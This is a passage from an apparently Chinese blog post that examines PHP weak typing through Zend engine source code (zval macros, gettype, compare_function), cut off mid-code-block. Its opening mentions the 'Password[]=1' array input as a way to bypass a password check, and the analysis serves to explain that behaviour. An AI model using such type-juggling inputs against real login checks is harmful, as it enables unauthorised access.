greater<br>这是一种PHP的定义。<br>那么究竟PHP到底在哪定义了这种特点呢？<br>我们依旧不知道。<br>我们再抛出个问题究竟什么是PHP弱类型呢？<br>很多人可能会回答弱类型就是弱类型，当传入Password[]=1就会绕过这就是弱类型<br>这种回答肯定是不妥当的<br>具体弱类型定义</p><blockquote><p>PHP是弱类型语言，不需要明确的定义变量的类型，变量的类型根据使用时的上下文所决定，也就是变量会根据不同表达式所需要的类型自动转换，比如求和，PHP会将两个相加的值转为long、double再进行加和。每种类型转为另外一种类型都有固定的规则，当某个操作发现类型不符时就会按照这个规则进行转换，这个规则正是弱类型实现的基础。</p></blockquote><p>我们再通过查阅PHP源码来深刻理解PHP弱类型的特点<br>PHP是开源的一种语言，我们在Github上可以很容易的查询到它的源码<br><a href="https://github.com/php/php-src/blob/master/Zend/zend_operators.h" target="_blank" rel="noopener">传送门</a><br>这里找函数会方便点<br>当然解释下什么是Zend</p><blockquote><p>Zend是PHP语言实现的最为重要的部分，是PHP最基础、最核心的部分，它的源码在/Zend目录下，PHP代码从编译到执行都是由Zend完成的</p></blockquote><p>至于为什么要查询zend_operators.h这个文件，operator操作符，其他几个文件不像存在比较函数，有的时候查源码时候就是需要靠感觉，这种大项目 函数变量什么的都有规范 一般所见即所得 看懂英语就大概猜得到用途的，<br>当然这个文件也不一般<br>我再进行解释下,当然想深入理解可以看<a href="http://wiki.jikexueyuan.com/project/extending-embedding-php/2.1.html" target="_blank" rel="noopener">这里</a></p><blockquote><p>PHP在内核中是通过zval这个结构体来存储变量的，它的定义在Zend/zend.h文件里，简短精炼，只有四个成员组成：</p></blockquote><p>我们定位到函数</p><blockquote><p>ZEND_API int ZEND_FASTCALL is_smaller_function(zval <em>result, zval </em>op1, zval *op2);</p></blockquote><p>这里传入了两个值op1,op2,传出一个result<br>解释下zval类型</p><blockquote><p>zval以一个P结尾的宏的参数大多是*zval型变量。 此外获取变量类型的宏还有两个，分别是Z_TYPE和Z_TYPE_PP，前者的参数是zval型，而后者的参数则是**zval。</p></blockquote><p>这样说可能会有些抽象<br>我们换种方式解释，当再php源码中要想判断一个变量的类型最直接的方式，比如想判断这个变量是否为空<br>变量-&gt;type == IS_NULL</p><p>这种方法虽然是正确的，但PHP官网并不建议这么做，PHP中定义了大量的宏，供我们检测、操作变量使用<br>解释下什么是宏</p><blockquote><p>C语言中允许用一个标识符来标识一个字符串，称为“宏”；标识符为“宏名”。在编译预处理时，对程序中所有出现的“宏名”，都用宏定义时的字符串去代换，简称“宏代换”或“宏展开”。一般形式：#define 宏名 字符串</p></blockquote><p>宏定义说明及注意：</p><blockquote><p>宏定义时用宏名来表示一个字符串，在宏展开时又以该字符串替换了宏名，这只是一个简单的替换；<br>宏定义不需要再行末加分号，若加上分号，则会连分号也会被替换的；<br>宏定义必须在函数外面；宏定义的作用域：从定义命令至程序结束，若想终止宏的作用域，则使用undef命令；<br>宏名在程序中用引号括起来，则预处理程序对其不进行宏替换；<br>宏定义是可以嵌套使用的，在展开时，由预处理程序层层替换；<br>建议在进行宏定义时，尽量使用大写字母表示宏名；<br>可用宏来表示数据类型，使书写方便；<br>对“输出格式”做用定义，可以减少书写麻烦。</p></blockquote><p>PHP建议使用的形式<br>Z_TYPE_P(变量) == IS_NULL</p><blockquote><p>以一个P结尾的宏的参数大多是*zval型变量。 此外获取变量类型的宏还有两个，分别是Z_TYPE和Z_TYPE_PP，前者的参数是zval型，而后者的参数则是**zval</p></blockquote><p>这样我们便可以猜测一下php内核是如何实现gettype这个函数了，代码如下：想要详细了解的可以看<a href="http://wiki.jikexueyuan.com/project/extending-embedding-php/2.1.html" target="_blank" rel="noopener">这里</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">//开始定义php语言中的函数gettype</span><br><span class="line">PHP_FUNCTION(gettype)</span><br><span class="line">&#123;</span><br><span class="line">    //arg间接指向调用gettype函数时所传递的参数。是一个zval**结构</span><br><span class="line">    //所以我们要对他使用__PP后缀的宏。</span><br><span class="line">    zval **arg;</span><br><span class="line"></span><br><span class="line">    //这个if的操作主要是让arg指向参数～</span><br><span class="line">    if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, &quot;Z&quot;, &amp;arg) == FAILURE) &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //调用Z_TYPE_PP宏来获取arg指向zval的类型。</span><br><span class="line">    //然后是一个switch结构，RETVAL_STRING宏代表这gettype函数返回的字符串类型的值</span><br><span class="line">    switch (Z_TYPE_PP(arg)) &#123;</span><br><span class="line">        case IS_NULL:</span><br><span class="line">            RETVAL_STRING(&quot;NULL&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_BOOL:</span><br><span class="line">            RETVAL_STRING(&quot;boolean&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_LONG:</span><br><span class="line">            RETVAL_STRING(&quot;integer&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_DOUBLE:</span><br><span class="line">            RETVAL_STRING(&quot;double&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_STRING:</span><br><span class="line">            RETVAL_STRING(&quot;string&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_ARRAY:</span><br><span class="line">            RETVAL_STRING(&quot;array&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_OBJECT:</span><br><span class="line">            RETVAL_STRING(&quot;object&quot;, 1);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case IS_RESOURCE:</span><br><span class="line">            &#123;</span><br><span class="line">                char *type_name;</span><br><span class="line">                type_name = zend_rsrc_list_get_rsrc_type(Z_LVAL_PP(arg) TSRMLS_CC);</span><br><span class="line">                if (type_name) &#123;</span><br><span class="line">                    RETVAL_STRING(&quot;resource&quot;, 1);</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        default:</span><br><span class="line">            RETVAL_STRING(&quot;unknown type&quot;, 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以上三个宏的定义在Zend/zend_operators.h里，定义分别是：</p><blockquote><p>#define Z_TYPE(zval)        (zval).type</p></blockquote><p>#define Z_TYPE_P(zval_p)    Z_TYPE(*zval_p)</p><p>#define Z_TYPE_PP(zval_pp)  Z_TYPE(**zval_pp)</p><p>这也是为是什么在Zend/zend_operators.h里面进行查询的原因，貌似有些跑题了？</p><p>当然下一个问题，为什么我们要定位到函数is_smaller_function<br>这里主要是靠对于PHP源码的熟悉，进行猜测，当然有的时候分析源码的时候可以讲PHP源码下载下载，部分IDE会有提供函数来源的功能<br>其实本来有个</p><blockquote><p>   lxr.php.net</p></blockquote><p>可以让我们迅速定位到我们想要的函数，但是这个网站在16年后就不是很稳定了，甚至有人将它当做一个BUG提交给PHP官网，这是一个很有趣的事情，具体可以了解<a href="https://bugs.php.net/bug.php?id=72396" target="_blank" rel="noopener">这里</a><br>那么我们还有没有什么办法迅速定位到我们需要的函数呢？</p><p>进入is_smaller_function的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ZEND_API int ZEND_FASTCALL is_smaller_function(zval *result, zval *op1, zval *op2) /* &#123;&#123;&#123; */</span><br><span class="line">&#123;</span><br><span class="line">if (compare_function(result, op1, op2) == FAILURE) &#123;</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br><span class="line">ZVAL_BOOL(result, (Z_LVAL_P(result) &lt; 0));</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里有一个compare_function函数以及<br>ZVAL_BOOL<br>我们先分析下compare_function函数<br>跟进<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">ZEND_API int ZEND_FASTCALL compare_function(zval *result, zval *op1, zval *op2) /* &#123;&#123;&#123; */</span><br><span class="line">&#123;</span><br><span class="line">int ret;</span><br><span class="line">int converted = 0;</span><br><span class="line">zval op1_copy, op2_copy;</span><br><span class="line">zval *op_free, tmp_free;</span><br><span class="line"></span><br><span class="line">while (1) &#123;</span><br><span class="line">switch (TYPE_PAIR(Z_TYPE_P(op1), Z_TYPE_P(op2))) &#123;</span><br><span class="line">case TYPE_PAIR(IS_LONG, IS_LONG):</span><br><span class="line">ZVAL_LONG(result, Z_LVAL_P(op1)&gt;Z_LVAL_P(op2)?1:(Z_LVAL_P(op1)&lt;Z_LVAL_P(op2)?-1:0));</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_DOUBLE, IS_LONG):</span><br><span class="line">Z_DVAL_P(result) = Z_DVAL_P(op1) - (double)Z_LVAL_P(op2);</span><br><span class="line">ZVAL_LONG(result, ZEND_NORMALIZE_BOOL(Z_DVAL_P(result)));</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_LONG, IS_DOUBLE):</span><br><span class="line">Z_DVAL_P(result) = (double)Z_LVAL_P(op1) - Z_DVAL_P(op2);</span><br><span class="line">ZVAL_LONG(result, ZEND_NORMALIZE_BOOL(Z_DVAL_P(result)));</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_DOUBLE, IS_DOUBLE):</span><br><span class="line">if (Z_DVAL_P(op1) == Z_DVAL_P(op2)) &#123;</span><br><span class="line">ZVAL_LONG(result, 0);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">Z_DVAL_P(result) = Z_DVAL_P(op1) - Z_DVAL_P(op2);</span><br><span class="line">ZVAL_LONG(result, ZEND_NORMALIZE_BOOL(Z_DVAL_P(result)));</span><br><span class="line">&#125;</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_ARRAY, IS_ARRAY):</span><br><span class="line">ZVAL_LONG(result, zend_compare_arrays(op1, op2));</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_NULL, IS_NULL):</span><br><span class="line">case TYPE_PAIR(IS_NULL, IS_FALSE):</span><br><span class="line">case TYPE_PAIR(IS_FALSE, IS_NULL):</span><br><span class="line">case TYPE_PAIR(IS_FALSE, IS_FALSE):</span><br><span class="line">case TYPE_PAIR(IS_TRUE, IS_TRUE):</span><br><span class="line">ZVAL_LONG(result, 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_NULL, IS_TRUE):</span><br><span class="line">ZVAL_LONG(result, -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_TRUE, IS_NULL):</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_STRING, IS_STRING):</span><br><span class="line">if (Z_STR_P(op1) == Z_STR_P(op2)) &#123;</span><br><span class="line">ZVAL_LONG(result, 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">ZVAL_LONG(result, zendi_smart_strcmp(Z_STR_P(op1), Z_STR_P(op2)));</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_NULL, IS_STRING):</span><br><span class="line">ZVAL_LONG(result, Z_STRLEN_P(op2) == 0 ? 0 : -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_STRING, IS_NULL):</span><br><span class="line">ZVAL_LONG(result, Z_STRLEN_P(op1) == 0 ? 0 : 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_OBJECT, IS_NULL):</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">case TYPE_PAIR(IS_NULL, IS_OBJECT):</span><br><span class="line">ZVAL_LONG(result, -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line"></span><br><span class="line">default:</span><br><span class="line">if (Z_ISREF_P(op1)) &#123;</span><br><span class="line">op1 = Z_REFVAL_P(op1);</span><br><span class="line">continue;</span><br><span class="line">&#125; else if (Z_ISREF_P(op2)) &#123;</span><br><span class="line">op2 = Z_REFVAL_P(op2);</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Z_TYPE_P(op1) == IS_OBJECT &amp;&amp; Z_OBJ_HANDLER_P(op1, compare)) &#123;</span><br><span class="line">ret = Z_OBJ_HANDLER_P(op1, compare)(result, op1, op2);</span><br><span class="line">if (UNEXPECTED(Z_TYPE_P(result) != IS_LONG)) &#123;</span><br><span class="line">convert_compare_result_to_long(result);</span><br><span class="line">&#125;</span><br><span class="line">return ret;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) == IS_OBJECT &amp;&amp; Z_OBJ_HANDLER_P(op2, compare)) &#123;</span><br><span class="line">ret = Z_OBJ_HANDLER_P(op2, compare)(result, op1, op2);</span><br><span class="line">if (UNEXPECTED(Z_TYPE_P(result) != IS_LONG)) &#123;</span><br><span class="line">convert_compare_result_to_long(result);</span><br><span class="line">&#125;</span><br><span class="line">return ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Z_TYPE_P(op1) == IS_OBJECT &amp;&amp; Z_TYPE_P(op2) == IS_OBJECT) &#123;</span><br><span class="line">if (Z_OBJ_P(op1) == Z_OBJ_P(op2)) &#123;</span><br><span class="line">/* object handles are identical, apparently this is the same object */</span><br><span class="line">ZVAL_LONG(result, 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">if (Z_OBJ_HANDLER_P(op1, compare_objects) == Z_OBJ_HANDLER_P(op2, compare_objects)) &#123;</span><br><span class="line">ZVAL_LONG(result, Z_OBJ_HANDLER_P(op1, compare_objects)(op1, op2));</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (Z_TYPE_P(op1) == IS_OBJECT) &#123;</span><br><span class="line">if (Z_OBJ_HT_P(op1)-&gt;get) &#123;</span><br><span class="line">zval rv;</span><br><span class="line">op_free = Z_OBJ_HT_P(op1)-&gt;get(Z_OBJ_P(op1), &amp;rv);</span><br><span class="line">ret = compare_function(result, op_free, op2);</span><br><span class="line">zend_free_obj_get_result(op_free);</span><br><span class="line">return ret;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) != IS_OBJECT &amp;&amp; Z_OBJ_HT_P(op1)-&gt;cast_object) &#123;</span><br><span class="line">ZVAL_UNDEF(&amp;tmp_free);</span><br><span class="line">if (Z_OBJ_HT_P(op1)-&gt;cast_object(Z_OBJ_P(op1), &amp;tmp_free, ((Z_TYPE_P(op2) == IS_FALSE || Z_TYPE_P(op2) == IS_TRUE) ? _IS_BOOL : Z_TYPE_P(op2))) == FAILURE) &#123;</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">zend_free_obj_get_result(&amp;tmp_free);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">ret = compare_function(result, &amp;tmp_free, op2);</span><br><span class="line">zend_free_obj_get_result(&amp;tmp_free);</span><br><span class="line">return ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (Z_TYPE_P(op2) == IS_OBJECT) &#123;</span><br><span class="line">if (Z_OBJ_HT_P(op2)-&gt;get) &#123;</span><br><span class="line">zval rv;</span><br><span class="line">op_free = Z_OBJ_HT_P(op2)-&gt;get(Z_OBJ_P(op2), &amp;rv);</span><br><span class="line">ret = compare_function(result, op1, op_free);</span><br><span class="line">zend_free_obj_get_result(op_free);</span><br><span class="line">return ret;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1) != IS_OBJECT &amp;&amp; Z_OBJ_HT_P(op2)-&gt;cast_object) &#123;</span><br><span class="line">ZVAL_UNDEF(&amp;tmp_free);</span><br><span class="line">if (Z_OBJ_HT_P(op2)-&gt;cast_object(Z_OBJ_P(op2), &amp;tmp_free, ((Z_TYPE_P(op1) == IS_FALSE || Z_TYPE_P(op1) == IS_TRUE) ? _IS_BOOL : Z_TYPE_P(op1))) == FAILURE) &#123;</span><br><span class="line">ZVAL_LONG(result, -1);</span><br><span class="line">zend_free_obj_get_result(&amp;tmp_free);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">ret = compare_function(result, op1, &amp;tmp_free);</span><br><span class="line">zend_free_obj_get_result(&amp;tmp_free);</span><br><span class="line">return ret;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1) == IS_OBJECT) &#123;</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (!converted) &#123;</span><br><span class="line">if (Z_TYPE_P(op1) &lt; IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op2) ? -1 : 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1) == IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op2) ? 0 : 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) &lt; IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op1) ? 1 : 0);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2) == IS_TRUE) &#123;</span><br><span class="line">ZVAL_LONG(result, zval_is_true(op1) ? 0 : -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">op1 = zendi_convert_scalar_to_number(op1, &amp;op1_copy, result, 1);</span><br><span class="line">op2 = zendi_convert_scalar_to_number(op2, &amp;op2_copy, result, 1);</span><br><span class="line">if (EG(exception)) &#123;</span><br><span class="line">if (result != op1) &#123;</span><br><span class="line">ZVAL_UNDEF(result);</span><br><span class="line">&#125;</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br><span class="line">converted = 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else if (Z_TYPE_P(op1)==IS_ARRAY) &#123;</span><br><span class="line">ZVAL_LONG(result, 1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else if (Z_TYPE_P(op2)==IS_ARRAY) &#123;</span><br><span class="line">ZVAL_LONG(result, -1);</span><br><span class="line">return SUCCESS;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">ZEND_ASSERT(0);</span><br><span class="line">zend_throw_error(NULL, &quot;Unsupported operand types&quot;);</span><br><span class="line">if (result != op1) &#123;</span><br><span class="line">ZVAL_UNDEF(result);</span><br><span class="line">&#125;</span><br><span class="line">return FAILURE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">/* &#125;&#125;&#125; */</span><br></pre></td></tr></table></figure></p><p>有点长，想要仔细了解的可以详细看<br>讲解下<br>首先<br><img src="https://i.imgur.com/EM4vsEN.png" alt=""><br>这个先等下说<br><img src="https://i.imgur.com/gMWqzae.png" alt=""><br>这里进行swich 判断op1 与 op2 的类型<br>这里我们先拿第一句进行分析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">case TYPE_PAIR(IS_LONG, IS_LONG):</span><br><span class="line">ZVAL_LONG(result, Z_LVAL_P(op1)&gt;Z_LVAL_P(op2)?1:(Z_LVAL_P(op1)&lt;Z_LVAL_P(op2)?-1:0));</span><br><span class="line">return SUCCESS;</span><br></pre></td></tr></table></figure></p><p>这里op1与op2都是IS_LONG类型<br>PHP中一共如下八种数据类型，具体想了解可以点<a href="http://wiki.jikexueyuan.com/project/extending-embedding-php/2.1.html" target="_blank" rel="noopener"></a><br><img src="https://i.imgur.com/tFGcobN.png" alt=""><br><img src="https://i.imgur.com/4N2WHJq.png" alt=""><br>所以IS_LONG是一种PHP种的整型。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZVAL_LONG(result, Z_LVAL_P(op1)&gt;Z_LVAL_P(op2)?1:(Z_LVAL_P(op1)&lt;Z_LVAL_P(op2)?-1:0));</span><br></pre></td></tr></table></figure></p><p>这句的意思是进行比较OP1，OP2的大小分别返回-1，0，1到result，<br><img src="https://i.imgur.com/AXhqNdV.png" alt=""><br>这里的result是有作用的，<br><img src="https://i.imgur.com/9IXloG3.png" alt=""><br>这里有一个ZVAL_BOOL函数进行判断，用于设置布尔值的zval ，ZVAL_BOOL就是定义这个zval的类型为bool。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define ZVAL_BOOL(z, b) do &#123;            \</span><br><span class="line">        Z_TYPE_INFO_P(z) =              \</span><br><span class="line">            (b) ? IS_TRUE : IS_FALSE;   \</span><br><span class="line">    &#125; while (0)</span><br></pre></td></tr></table></figure></p><p>换成当前的场景<br>result为z ，(Z_LVAL_P(result) &lt; 0)为b<br>z 为用于设置布尔值的zval<br>b 为 设置的布尔值</p><p><img src="https://i.imgur.com/p6nTs1r.png" alt=""></p><p>这个函数 名是is_smaller_function具体意思已经很明显了</p><p>只有 Z_LVAL_P(result) &lt; 0，当result=-1<br>（即op1&lt;op2的时候 result才为-1）<br>才会使b=1 并且使得<br>(b) ? IS_TRUE : IS_FALSE; 判断为IS_TRUE<br>并使得Z_TYPE_INFO_P(result) 为IS_TRUE，<br>最后就是根据Z_TYPE_INFO_P(result) 使IS_TRUE或者IS_FALSE来判断究竟是否小于</p><p>下一句<br><img src="https://i.imgur.com/XVUpc3Q.png" alt=""></p><p>因为两个值是可以进行比较的它会return SUCCESS，我是这么理解的<br><img src="https://i.imgur.com/2F2DLva.png" alt=""></p><p>如果有人看到这里，对于PHP究竟是如何判断大小应该有了基本的认识了吧<br>回到我们最开始的问题<br><img src="https://i.imgur.com/6isxsTs.png" alt=""><br>那么我们就应该取寻找OP1与OP2分别为array类型与IS_LONG的case<br>与OP1与OP2分别为array类型与array类型<br>当然阅读这些case的时候又冒出了个问题<br><img src="https://i.imgur.com/gvfdjFW.png" alt=""><br>这个又是什么意思呢？<br>经过查询我们可以知道这句话来源于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define Z_ISREF(zval) (Z_TYPE(zval) == IS_REFERENCE)</span><br></pre></td></tr></table></figure></p><p>其意思为<br>该zval检查它是否是一个引用类型，姑且认为是判断这个变量是否属于PHP八种变量中的一种，<br>那么IS_REFERENCE又是什么呢</p><blockquote><p>此类型用于表示a zval是PHP引用。引用的值zval需要首先解除引用才能使用它。这可以使用ZVAL_DEREF或Z_REF宏来完成。zval可以检查A 以查看它是否是Z_ISREF宏的引用。</p></blockquote><p>姑且认为这个意思是zaval确实是PHP引用的变量之一</p><p>那么整句话的我的理解是，当发生default:的时候假如OP1,OP2是PHP引用变量之一那么就继续<br>接下来的几个case都不属于我们想要的情况<br>直到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 